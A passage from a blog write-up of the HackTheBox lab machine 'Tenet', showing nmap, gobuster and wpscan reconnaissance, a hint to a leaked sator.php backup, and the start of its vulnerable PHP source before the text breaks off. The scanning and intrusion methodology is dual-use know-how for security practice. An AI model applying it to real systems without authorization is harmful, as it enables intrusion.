<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>Tenet - 0xbro@blog</title> <meta name="Description" content="Tenet is an medium difficulty Linux machine on HackTheBox vulnerable to PHP deserialization vulnerability and based on code review."> <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.7.1 --> <title>Tenet | 0xbro@blog</title> <meta name="generator" content="Jekyll v4.2.0" /> <meta property="og:title" content="Tenet" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="Tenet is an medium difficulty Linux machine on HackTheBox vulnerable to PHP deserialization vulnerability and based on code review." /> <meta property="og:description" content="Tenet is an medium difficulty Linux machine on HackTheBox vulnerable to PHP deserialization vulnerability and based on code review." /> <link rel="canonical" href="https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/" /> <meta property="og:url" content="https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/" /> <meta property="og:site_name" content="0xbro@blog" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2021-06-12T00:00:00+02:00" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="Tenet" /> <script type="application/ld+json"> {"@type":"BlogPosting","headline":"Tenet","dateModified":"2021-06-12T00:00:00+02:00","url":"https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/","datePublished":"2021-06-12T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/"},"description":"Tenet is an medium difficulty Linux machine on HackTheBox vulnerable to PHP deserialization vulnerability and based on code review.","@context":"https://schema.org"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <div class="side-bar"> <div class="site-header"> <a href="https://maoutis.github.io/" class="site-title lh-tight"> 0xbro@blog </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <div class="nav-category">Pages</div> <ul class="nav-list"><li class="nav-list-item"><a href="https://maoutis.github.io/" class="nav-list-link">Home</a></li><li class="nav-list-item"><a href="https://maoutis.github.io/about/" class="nav-list-link">About me</a></li><li class="nav-list-item"><a href="https://maoutis.github.io/contacts/" class="nav-list-link">Contact me</a></li><li class="nav-list-item"><a href="https://maoutis.github.io/achievements/" class="nav-list-link">Roadmap</a></li></ul> <div class="nav-category">Writeups</div> <ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/writeups/HackTheBox/" class="nav-list-link">HackTheBox</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-07-24-Armageddon/" class="nav-list-link">Armageddon</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-06-26-Spectra/" class="nav-list-link">Spectra</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-07-03-Ophiuchi/" class="nav-list-link">Ophiuchi</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-06-05-ScriptKiddie/" class="nav-list-link">ScriptKiddie</a></li><li class="nav-list-item active"><a href="https://maoutis.github.io/writeups/HackTheBox/2021-06-12-Tenet/" class="nav-list-link active">Tenet</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-05-22-Delivery/" class="nav-list-link">Delivery</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2021-05-14-Ready/" class="nav-list-link">Ready</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/" class="nav-list-link">Tabby</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-05-30-Blunder/" class="nav-list-link">Blunder</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-03-14-Traceback/" class="nav-list-link">Traceback</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2020-01-04-OpenAdmin/" class="nav-list-link">OpenAdmin</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-30-Obscurity/" class="nav-list-link">Obscurity</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-16-Traverxec/" class="nav-list-link">Traverxec</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-11-02-Postman/" class="nav-list-link">Postman</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/writeups/HackTheBox/2019-06-08-Writeup/" class="nav-list-link">Writeup</a></li></ul></li></ul> <div class="nav-category">Tool cheatsheets</div> <ul class="nav-list"><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/tool-cheatsheets/Misc/" class="nav-list-link">Misc</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Misc/Dynamic%20Servers/" class="nav-list-link">Dynamic Servers</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Misc/impacket/" class="nav-list-link">Impacket</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Misc/netcat/" class="nav-list-link">netcat (nc)</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Misc/powercat/" class="nav-list-link">powercat</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/tool-cheatsheets/Terms%20&%20Editors/" class="nav-list-link">Terms & Editors</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Terms%20&%20Editors/Tmux/" class="nav-list-link">Tmux</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/tool-cheatsheets/Traffic%20Sniffer/" class="nav-list-link">Traffic Sniffer</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Traffic%20Sniffer/tcpdump/" class="nav-list-link">tcpdump</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Traffic%20Sniffer/wireshark/" class="nav-list-link">wireshark</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/tool-cheatsheets/Web%20Busting%20&%20Fuzzing/" class="nav-list-link">Web Busting & Fuzzing</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Web%20Busting%20&%20Fuzzing/ffuf/" class="nav-list-link">ffuf</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/tool-cheatsheets/Web%20Busting%20&%20Fuzzing/gobuster/" class="nav-list-link">gobuster</a></li></ul></li></ul> <div class="nav-category">Pentest cheatsheets</div> <ul class="nav-list"><li class="nav-list-item"><a href="https://maoutis.github.io/pentest-cheatsheets/file-transfer/" class="nav-list-link">File transfer</a></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/" class="nav-list-link">Privilege Escalation</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Linux/" class="nav-list-link">Linux</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Windows/" class="nav-list-link">Windows</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Privilege%20Escalation/Maintaining%20the%20access/" class="nav-list-link">Maintaining the access</a></li></ul></li><li class="nav-list-item"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="https://maoutis.github.io/pentest-cheatsheets/shells/" class="nav-list-link">Shells</a><ul class="nav-list "><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Shells/rev-shells/" class="nav-list-link">Reverse shell cheatsheet</a></li><li class="nav-list-item "><a href="https://maoutis.github.io/pentest-cheatsheets/Shells/shell-upgrade/" class="nav-list-link">Upgrade your shell</a></li></ul></li></ul> <div class="nav-category">Articles and Posts</div> <ul class="nav-list"><li class="nav-list-item"><a href="https://maoutis.github.io/posts/2021-06-04-My-OSCP-Journey/" class="nav-list-link">My OSCP Journey</a></li></ul> </nav> <footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll. </footer> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search 0xbro@blog" aria-label="Search 0xbro@blog" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> <nav aria-label="Auxiliary" class="aux-nav"> <ul class="aux-nav-list"> <li class="aux-nav-list-item"> <a href="/support-me/" class="site-button" > Support me! </a> </li> </ul> </nav> </div> <div id="main-content-wrap" class="main-content-wrap"> <nav aria-label="Breadcrumb" class="breadcrumb-nav"> <ol class="breadcrumb-nav-list"> <li class="breadcrumb-nav-list-item"><a href="">HackTheBox</a></li> <li class="breadcrumb-nav-list-item"><span>Tenet</span></li> </ol> </nav> <div id="main-content" class="main-content" role="main"> <style> .time { text-align: center; margin-top: 30px; font-family: 'Open Sans', sans-serif; font-weight: 300; font-style: normal; } </style> <p class="time">12 Jun 2021 | Reading time: ~11 min</p> <h1 align="center"> HackTheBox - Tenet [Medium] </h1> <p class="time" style="font-size: 75%;"> #HackTheBox #Medium #Linux #B2R #code-review #php-deserialization #password-reuse #hardcoded-credentials #race-condition #temp-file-poisoning #writeup </p> <p><img src="/assets/images/Screenshots/Tenet/box-summary.jpg" alt="box-summary.jpg" /></p><hr /> <h2 class="no_toc text-delta" id="table-of-contents"> <a href="#table-of-contents" class="anchor-heading" aria-labelledby="table-of-contents"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Table of contents </h2> <ol id="markdown-toc"> <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a> <ol> <li><a href="#improved-skills" id="markdown-toc-improved-skills">Improved skills:</a></li> <li><a href="#used-tools" id="markdown-toc-used-tools">Used tools:</a></li> </ol> </li> <li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a></li> <li><a href="#foothold" id="markdown-toc-foothold">Foothold</a></li> <li><a href="#lateral-movement" id="markdown-toc-lateral-movement">Lateral Movement</a></li> <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a></li> <li><a href="#trophy" id="markdown-toc-trophy">Trophy</a></li> <li><a href="#video" id="markdown-toc-video">Video</a></li> </ol><hr /> <h2 id="introduction"> <a href="#introduction" class="anchor-heading" aria-labelledby="introduction"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Introduction </h2> <p><strong>Tenet</strong> is a medium difficulty Linux box based on <strong>code review</strong>. Initial enumeration allowed to discover a PHP file vulnerable to <strong>PHP deserialization</strong>, allowing to get a foothold on the box. Local enumeration allowed to discover <strong>hardcoded credentials</strong> and reuse them to get user access. From there, privilege escalation can be achieved exploiting a <strong>race condition</strong> on a sudo script which allowed to overwrite root’s private key and obtain a high privileged access.</p> <h3 id="improved-skills"> <a href="#improved-skills" class="anchor-heading" aria-labelledby="improved-skills"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Improved skills: </h3> <ul> <li>Code review</li> <li>PHP deserialization attacks</li> <li>Exploiting race condition</li> <li>Poisoning unsecured file</li> </ul> <h3 id="used-tools"> <a href="#used-tools" class="anchor-heading" aria-labelledby="used-tools"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Used tools: </h3> <ul> <li>nmap</li> <li>gobuster</li> <li>wpscan</li> <li>custom PHP script</li> </ul><hr /> <h2 id="enumeration"> <a href="#enumeration" class="anchor-heading" aria-labelledby="enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration </h2> <p>Scanned all TCP ports:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/box/Tenet]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p-</span> 10.10.10.223 <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-v</span>
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div> <p>Enumerated open TCP ports:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/box/Tenet]
└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-p22</span>,80 10.10.10.223 <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span> <span class="nt">-v</span> <span class="nt">-oN</span> scans/open-tcp-ports.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div> <p>Nmap revealed an Apache2 Ubuntu Default Page on port 80 and an OpenSSH service on port 22. <img src="/assets/images/Screenshots/Tenet/Pasted image 20210507210944.png" alt="Pasted image 20210507210944.png" /></p> <p>Because SSH usually does not offer a large attack surface, enumeration of target was primary focused on port 80. In order to find any possible entry point, web files and directories were enumerated using gobuster:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/box/Tenet]
└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.223/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="nt">-o</span> scans/p80-enum-dirs.txt <span class="nt">-f</span> <span class="nt">-r</span>
...
/icons/               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/server-status/       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/box/Tenet]
└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.223/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt <span class="nt">-o</span> scans/p80-enum-files.txt
...
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918]
/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.php                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htm                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htpasswds           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htgroup             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/wp-forum.phps        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess.bak        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htuser              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htc                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.ht                  <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/users.txt            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7]

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/box/Tenet]
└─<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.223/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt <span class="nt">-o</span> scans/p80-common-ext.txt <span class="nt">-x</span> txt,php,html
...
/.php                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.html                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.html.txt            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.html.php            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.html.html           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918]
/.htm.txt             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htm.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htm.html            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htm                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/users.txt            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7]
/.                    <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 10918]
/wordpress            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.223/wordpress/]
/.htaccess.php        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess.html       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htaccess.txt        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.phtml               <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htc                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htc.txt             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htc.php             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.htc.html            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.html_var_de         <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.html_var_de.txt     <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.html_var_de.php     <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/.html_var_de.html    <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
</code></pre></div></div> <p>Enumeration revealed a <code class="language-plaintext highlighter-rouge">/wordpress/</code> directory: <img src="/assets/images/Screenshots/Tenet/Pasted image 20210507211948.png" alt="Pasted image 20210507211948.png" /></p> <p>Because the links of the page were pointing to <code class="language-plaintext highlighter-rouge">tenet.htb</code> and were messing up the resulting page, the domain was added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/CTFs/HTB/box/Tenet]
└─<span class="nv">$ </span><span class="nb">sudo </span>nano /etc/hosts
...
10.10.10.223    tenet.htb
</code></pre></div></div> <p><img src="/assets/images/Screenshots/Tenet/Pasted image 20210507212245.png" alt="Pasted image 20210507212245.png" /></p> <p>Because the target was a wordpress site, it was enumerated using wpscan:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB/box/Tenet/scans]
└─<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://tenet.htb/ <span class="nt">-o</span> p80-wordpress.txt
...
<span class="o">[</span>+] URL: http://tenet.htb/ <span class="o">[</span>10.10.10.223]
<span class="o">[</span>+] Started: Fri May  7 15:30:59 2021

Interesting Finding<span class="o">(</span>s<span class="o">)</span>:

<span class="o">[</span>+] Headers
 | Interesting Entry: Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
 | Found By: Headers <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] XML-RPC seems to be enabled: http://tenet.htb/xmlrpc.php
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

<span class="o">[</span>+] WordPress readme found: http://tenet.htb/readme.html
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] Upload directory has listing enabled: http://tenet.htb/wp-content/uploads/
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 100%

<span class="o">[</span>+] The external WP-Cron seems to be enabled: http://tenet.htb/wp-cron.php
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

<span class="o">[</span>+] WordPress version 5.6 identified <span class="o">(</span>Outdated, released on 2020-12-08<span class="o">)</span><span class="nb">.</span>
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  - http://tenet.htb/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.6&lt;/generator&gt;
 |  - http://tenet.htb/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v<span class="o">=</span>5.6&lt;/generator&gt;

<span class="o">[</span>+] WordPress theme <span class="k">in </span>use: twentytwentyone
 | Location: http://tenet.htb/wp-content/themes/twentytwentyone/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://tenet.htb/wp-content/themes/twentytwentyone/readme.txt
 | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 1.2
 | Style URL: http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver<span class="o">=</span>1.0
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas <span class="k">for </span>your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
 |
 | Version: 1.0 <span class="o">(</span>80% confidence<span class="o">)</span>
 | Found By: Style <span class="o">(</span>Passive Detection<span class="o">)</span>
 |  - http://tenet.htb/wp-content/themes/twentytwentyone/style.css?ver<span class="o">=</span>1.0, Match: <span class="s1">'Version: 1.0'</span>
</code></pre></div></div> <p>At this point we had good information about the target, however there was still no exploitable vulnerabilities.</p> <p>Further enumeration of the site reveled an interesting comment made by <strong>neil</strong> talking about a php and a backup file:</p> <blockquote> <p><strong>We’re moving our data over from a flat file structure to something a bit more substantial</strong>. Please bear with us whilst we get one of our devs on the migration, which shouldn’t take too long. Thank you for your patience</p> </blockquote> <blockquote> <p><strong>neil</strong>: did you remove the <strong>sator php</strong> file and the <strong>backup</strong>?? the migration program is incomplete! why would you do this?!</p> </blockquote> <p>The search on tenet.htb was unsuccessful, but the IP search allowed to access the two files: <img src="/assets/images/Screenshots/Tenet/Pasted image 20210519231607.png" alt="Pasted image 20210519231607.png" /> <img src="/assets/images/Screenshots/Tenet/Pasted image 20210519231100.png" alt="Pasted image 20210519231100.png" /> <img src="/assets/images/Screenshots/Tenet/Pasted image 20210519231139.png" alt="Pasted image 20210519231139.png" /></p> <h2 id="foothold"> <a href="#foothold" class="anchor-heading" aria-labelledby="foothold"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Foothold </h2> <p>The backup file contained the source code of <code class="language-plaintext highlighter-rouge">sator.php</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/…/HTB/box/Tenet/loot]
└─<span class="nv">$ </span><span class="nb">cat</span> <span class="nt">-n</span>  sator.php.bak
     1  &lt;?php
     2
     3  class DatabaseExport
     4  <span class="o">{</span>
     5          public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
     6          public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
     7
     8          public <span class="k">function </span>update_db<span class="o">()</span>
     9          <span class="o">{</span>
    10                  <span class="nb">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
    11                  <span class="nv">$this</span>-&gt; data <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
    12          <span class="o">}</span>
    13
    14
